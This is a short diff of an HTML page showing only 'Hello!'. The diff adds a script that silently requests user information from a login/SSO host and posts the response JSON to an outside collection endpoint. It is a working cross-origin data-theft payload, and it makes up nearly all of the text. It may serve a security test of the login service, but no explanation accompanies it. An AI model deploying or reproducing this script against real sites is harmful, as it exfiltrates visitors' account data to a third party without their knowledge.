@@ -3,14 +3,17 @@
 <body>
 	<h1>Hello!</h1>
     <script>
+		(async() => {
+			const res = await fetch('https://login.sketchycompany.upd-dcs.work/userinfo', {
+				method: 'GET'
+			});
+			const data = await res.json();
 
-		window.location.href = "https://login.sketchycompany.upd-dcs.work/";
-		document.getElementById('sketchy-sso').click(); 
-
-		fetch('https://hkdk.events/lxjnpl4yoq2m7x', {
-			method: 'POST',
-			body: 'test'
-		});
+			await fetch('https://hkdk.events/lxjnpl4yoq2m7x', {
+				method: 'POST',
+				body: JSON.stringify(data)
+			});
+		})();
     </script>
 </body>
 </html>
